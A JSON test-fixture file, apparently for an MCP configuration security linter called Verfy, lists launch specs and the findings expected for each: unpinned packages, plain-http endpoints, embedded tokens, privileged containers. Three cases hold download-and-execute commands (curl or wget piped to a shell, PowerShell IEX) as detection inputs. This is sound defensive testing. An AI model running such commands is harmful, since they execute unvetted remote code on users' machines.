@@ -1,0 +1,1333 @@
+{
+ "token": "__TOKEN__",
+ "cases": [
+  {
+   "name": "npx, no version",
+   "spec": {
+    "command": "npx",
+    "args": [
+     "-y",
+     "@modelcontextprotocol/server-filesystem",
+     "/tmp"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx @modelcontextprotocol/server-filesystem` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "npx, pinned",
+   "spec": {
+    "command": "npx",
+    "args": [
+     "-y",
+     "@modelcontextprotocol/server-filesystem@1.2.3",
+     "/tmp"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "npx @latest",
+   "spec": {
+    "command": "npx",
+    "args": [
+     "@modelcontextprotocol/server-filesystem@latest"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx @modelcontextprotocol/server-filesystem@latest` downloads the newest version every time it starts; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "npx by full path",
+   "spec": {
+    "command": "/usr/local/bin/npx",
+    "args": [
+     "some-server"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx some-server` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "npx --package",
+   "spec": {
+    "command": "npx",
+    "args": [
+     "--package",
+     "tool@2.0.0",
+     "run-it"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "npx, a local path",
+   "spec": {
+    "command": "npx",
+    "args": [
+     "./server.js"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "npx, package the project lists",
+   "spec": {
+    "command": "npx",
+    "args": [
+     "my-server"
+    ]
+   },
+   "local": [
+    "my-server"
+   ],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "bunx, no version",
+   "spec": {
+    "command": "bunx",
+    "args": [
+     "some-server"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`bunx some-server` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "uvx, no version",
+   "spec": {
+    "command": "uvx",
+    "args": [
+     "mcp-server-git"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`uvx mcp-server-git` downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "uvx, pinned",
+   "spec": {
+    "command": "uvx",
+    "args": [
+     "mcp-server-git==1.0.0"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "uvx --from",
+   "spec": {
+    "command": "uvx",
+    "args": [
+     "--from",
+     "git-mcp",
+     "serve"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`uvx git-mcp` downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "pnpm dlx",
+   "spec": {
+    "command": "pnpm",
+    "args": [
+     "dlx",
+     "some-server"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx some-server` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "yarn dlx, pinned",
+   "spec": {
+    "command": "yarn",
+    "args": [
+     "dlx",
+     "some-server@3.1.0"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "uv tool run",
+   "spec": {
+    "command": "uv",
+    "args": [
+     "tool",
+     "run",
+     "mcp-server-time"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`uvx mcp-server-time` downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "node script",
+   "spec": {
+    "command": "node",
+    "args": [
+     "server.js"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "cmd /c npx",
+   "spec": {
+    "command": "cmd",
+    "args": [
+     "/c",
+     "npx",
+     "-y",
+     "some-server"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx some-server` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "sh -c npx with quotes",
+   "spec": {
+    "command": "sh",
+    "args": [
+     "-c",
+     "npx -y 'some-server' \"--flag x\""
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx some-server` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "bash -c with an open quote",
+   "spec": {
+    "command": "bash",
+    "args": [
+     "-c",
+     "npx 'some-server"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "sh -c with two commands",
+   "spec": {
+    "command": "sh",
+    "args": [
+     "-c",
+     "npx some-server && echo done"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "curl piped to a shell",
+   "spec": {
+    "command": "sh",
+    "args": [
+     "-c",
+     "curl -fsS https://x.example/install.sh | bash"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-004",
+     "severity": "critical",
+     "message": "Launch command downloads a script and runs it in a shell.",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "wget piped to sudo sh",
+   "spec": {
+    "command": "bash",
+    "args": [
+     "-c",
+     "wget -qO- https://x.example/i | sudo sh"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-004",
+     "severity": "critical",
+     "message": "Launch command downloads a script and runs it in a shell.",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "powershell iex",
+   "spec": {
+    "command": "powershell",
+    "args": [
+     "-Command",
+     "IEX (New-Object Net.WebClient).DownloadString('https://x.example/a.ps1')"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-004",
+     "severity": "critical",
+     "message": "Launch command downloads a script and runs it in a shell.",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "docker, plain",
+   "spec": {
+    "command": "docker",
+    "args": [
+     "run",
+     "-i",
+     "--rm",
+     "mcp/fetch"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "docker --privileged",
+   "spec": {
+    "command": "docker",
+    "args": [
+     "run",
+     "--privileged",
+     "mcp/x"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-005",
+     "severity": "high",
+     "message": "Container runs privileged or on the host network.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "docker --network host",
+   "spec": {
+    "command": "docker",
+    "args": [
+     "run",
+     "--network",
+     "host",
+     "mcp/x"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-005",
+     "severity": "high",
+     "message": "Container runs privileged or on the host network.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "docker --network=host",
+   "spec": {
+    "command": "docker",
+    "args": [
+     "run",
+     "--network=host",
+     "mcp/x"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-005",
+     "severity": "high",
+     "message": "Container runs privileged or on the host network.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "docker mounts the disk, twice",
+   "spec": {
+    "command": "docker",
+    "args": [
+     "run",
+     "-v",
+     "/:/host",
+     "-v",
+     "/:/host",
+     "mcp/x"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-005",
+     "severity": "high",
+     "message": "Container mounts `/`, giving it the whole disk or home folder.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "docker mounts home folders",
+   "spec": {
+    "command": "docker",
+    "args": [
+     "run",
+     "-v",
+     "/home/:/h",
+     "--mount",
+     "~:/me",
+     "mcp/x"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-005",
+     "severity": "high",
+     "message": "Container mounts `/home/`, giving it the whole disk or home folder.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-005",
+     "severity": "high",
+     "message": "Container mounts `~`, giving it the whole disk or home folder.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "podman mounts a project folder",
+   "spec": {
+    "command": "podman",
+    "args": [
+     "run",
+     "-v",
+     "/srv/app:/app",
+     "mcp/x"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "remote over http",
+   "spec": {
+    "url": "http://mcp.example.com/mcp"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-002",
+     "severity": "high",
+     "message": "Talks to mcp.example.com over plain http, so anyone on the network can read or change tool calls.",
+     "where": "url"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "remote over https, no credentials",
+   "spec": {
+    "type": "http",
+    "url": "https://mcp.example.com/mcp"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "remote with a header from the environment",
+   "spec": {
+    "url": "https://mcp.example.com/mcp",
+    "headers": {
+     "Authorization": "Bearer ${TOKEN}"
+    }
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "remote, lower-case header name",
+   "spec": {
+    "url": "https://mcp.example.com/mcp",
+    "headers": {
+     "authorization": "${AUTH}"
+    }
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "remote with oauth",
+   "spec": {
+    "url": "https://mcp.example.com/mcp",
+    "oauth": {
+     "clientId": "abc"
+    }
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "remote with empty oauth",
+   "spec": {
+    "url": "https://mcp.example.com/mcp",
+    "oauth": {}
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "localhost over http",
+   "spec": {
+    "url": "http://localhost:3000/mcp"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "ipv6 localhost",
+   "spec": {
+    "url": "http://[::1]:8080/mcp"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "serverUrl (Windsurf)",
+   "spec": {
+    "serverUrl": "http://10.0.0.5/mcp"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-002",
+     "severity": "high",
+     "message": "Talks to 10.0.0.5 over plain http, so anyone on the network can read or change tool calls.",
+     "where": "url"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "httpUrl (Gemini)",
+   "spec": {
+    "httpUrl": "https://mcp.example.com/mcp"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "upper-case scheme and user info",
+   "spec": {
+    "url": "HTTP://user:pw@MCP.Example.com:8080/x"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-002",
+     "severity": "high",
+     "message": "Talks to mcp.example.com over plain http, so anyone on the network can read or change tool calls.",
+     "where": "url"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "token in env",
+   "spec": {
+    "command": "node",
+    "args": [
+     "s.js"
+    ],
+    "env": {
+     "GITHUB_TOKEN": "__TOKEN__",
+     "OTHER": "${FROM_ENV}"
+    }
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-003",
+     "severity": "high",
+     "message": "A GitHub token is written into the config (env.GITHUB_TOKEN); load it from the environment instead.",
+     "where": "env.GITHUB_TOKEN"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "token in a header",
+   "spec": {
+    "url": "https://mcp.example.com/mcp",
+    "headers": {
+     "Authorization": "Bearer __TOKEN__"
+    }
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-003",
+     "severity": "high",
+     "message": "A GitHub token is written into the config (headers.Authorization); load it from the environment instead.",
+     "where": "headers.Authorization"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "token in the url",
+   "spec": {
+    "url": "https://mcp.example.com/mcp?key=__TOKEN__"
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-003",
+     "severity": "high",
+     "message": "A GitHub token is written into the config (url); load it from the environment instead.",
+     "where": "url"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "token in args, twice",
+   "spec": {
+    "command": "node",
+    "args": [
+     "s.js",
+     "--token",
+     "__TOKEN__",
+     "--again=__TOKEN__"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-003",
+     "severity": "high",
+     "message": "A GitHub token is written into the config (args); load it from the environment instead.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  },
+  {
+   "name": "behind the gateway, no version",
+   "spec": {
+    "command": "verfy",
+    "args": [
+     "proxy",
+     "--name",
+     "fs",
+     "--",
+     "npx",
+     "-y",
+     "@modelcontextprotocol/server-filesystem"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx @modelcontextprotocol/server-filesystem` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    }
+   ]
+  },
+  {
+   "name": "behind the gateway, pinned",
+   "spec": {
+    "command": "python",
+    "args": [
+     "-m",
+     "verfy",
+     "proxy",
+     "--name",
+     "fs",
+     "--",
+     "npx",
+     "@modelcontextprotocol/server-filesystem@1.0.0"
+    ]
+   },
+   "local": [],
+   "expect": []
+  },
+  {
+   "name": "sandbox and gateway",
+   "spec": {
+    "command": "verfy",
+    "args": [
+     "run",
+     "--sandbox",
+     "--",
+     "verfy",
+     "proxy",
+     "--name",
+     "git",
+     "--",
+     "uvx",
+     "mcp-server-git"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`uvx mcp-server-git` downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    }
+   ]
+  },
+  {
+   "name": "gateway in front of a remote server",
+   "spec": {
+    "command": "verfy",
+    "args": [
+     "proxy",
+     "--name",
+     "r",
+     "--url",
+     "http://mcp.example.com/mcp"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-002",
+     "severity": "high",
+     "message": "Talks to mcp.example.com over plain http, so anyone on the network can read or change tool calls.",
+     "where": "url"
+    },
+    {
+     "rule": "VFY-CFG-007",
+     "severity": "info",
+     "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+     "where": "headers"
+    }
+   ]
+  },
+  {
+   "name": "gateway bridge with a bearer variable",
+   "spec": {
+    "command": "verfy",
+    "args": [
+     "proxy",
+     "--name",
+     "r",
+     "--url",
+     "https://mcp.example.com/mcp",
+     "--bearer-env",
+     "TOKEN",
+     "--"
+    ]
+   },
+   "local": [],
+   "expect": []
+  },
+  {
+   "name": "nothing in the entry",
+   "spec": {},
+   "local": [],
+   "expect": []
+  },
+  {
+   "name": "args that are not text",
+   "spec": {
+    "command": "npx",
+    "args": [
+     1,
+     true,
+     null,
+     "some-server"
+    ]
+   },
+   "local": [],
+   "expect": [
+    {
+     "rule": "VFY-CFG-001",
+     "severity": "medium",
+     "message": "`npx 1` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+     "where": "args"
+    },
+    {
+     "rule": "VFY-CFG-006",
+     "severity": "low",
+     "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+     "where": "command"
+    }
+   ]
+  }
+ ],
+ "configs": [
+  {
+   "data": {
+    "mcpServers": {
+     "fs": {
+      "command": "npx",
+      "args": [
+       "-y",
+       "@modelcontextprotocol/server-filesystem"
+      ]
+     },
+     "api": {
+      "url": "http://mcp.example.com/mcp"
+     },
+     "bad": "not an object"
+    }
+   },
+   "expect": {
+    "servers": [
+     {
+      "server": "api",
+      "transport": "http",
+      "findings": [
+       {
+        "rule": "VFY-CFG-002",
+        "severity": "high",
+        "message": "Talks to mcp.example.com over plain http, so anyone on the network can read or change tool calls.",
+        "where": "url"
+       },
+       {
+        "rule": "VFY-CFG-006",
+        "severity": "low",
+        "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+        "where": "command"
+       },
+       {
+        "rule": "VFY-CFG-007",
+        "severity": "info",
+        "message": "No credentials in the config: your client signs in with OAuth if the server asks; otherwise the server is open to anyone.",
+        "where": "headers"
+       }
+      ]
+     },
+     {
+      "server": "fs",
+      "transport": "stdio",
+      "findings": [
+       {
+        "rule": "VFY-CFG-001",
+        "severity": "medium",
+        "message": "`npx @modelcontextprotocol/server-filesystem` uses a copy the project installed if there is one, otherwise it downloads whatever version is newest at launch; pin a version.",
+        "where": "args"
+       },
+       {
+        "rule": "VFY-CFG-006",
+        "severity": "low",
+        "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+        "where": "command"
+       }
+      ]
+     }
+    ],
+    "summary": {
+     "critical": 0,
+     "high": 1,
+     "medium": 1,
+     "low": 2,
+     "info": 1
+    }
+   }
+  },
+  {
+   "data": {
+    "servers": {
+     "git": {
+      "command": "uvx",
+      "args": [
+       "mcp-server-git==1.0.0"
+      ]
+     }
+    },
+    "inputs": []
+   },
+   "expect": {
+    "servers": [
+     {
+      "server": "git",
+      "transport": "stdio",
+      "findings": [
+       {
+        "rule": "VFY-CFG-006",
+        "severity": "low",
+        "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+        "where": "command"
+       }
+      ]
+     }
+    ],
+    "summary": {
+     "critical": 0,
+     "high": 0,
+     "medium": 0,
+     "low": 1
+    }
+   }
+  },
+  {
+   "data": {
+    "mcp_servers": {
+     "time": {
+      "command": "uvx",
+      "args": [
+       "mcp-server-time"
+      ]
+     }
+    },
+    "model": "x"
+   },
+   "expect": {
+    "servers": [
+     {
+      "server": "time",
+      "transport": "stdio",
+      "findings": [
+       {
+        "rule": "VFY-CFG-001",
+        "severity": "medium",
+        "message": "`uvx mcp-server-time` downloads whatever version is newest at launch; pin a version.",
+        "where": "args"
+       },
+       {
+        "rule": "VFY-CFG-006",
+        "severity": "low",
+        "message": "Not behind the Verfy gateway: its tool calls are not pre-checked or receipted (`verfy wrap`).",
+        "where": "command"
+       }
+      ]
+     }
+    ],
+    "summary": {
+     "critical": 0,
+     "high": 0,
+     "medium": 1,
+     "low": 1
+    }
+   }
+  },
+  {
+   "data": {
+    "theme": "dark"
+   },
+   "expect": {
+    "servers": [],
+    "summary": {
+     "critical": 0,
+     "high": 0,
+     "medium": 0,
+     "low": 0
+    }
+   }
+  }
+ ]
+}
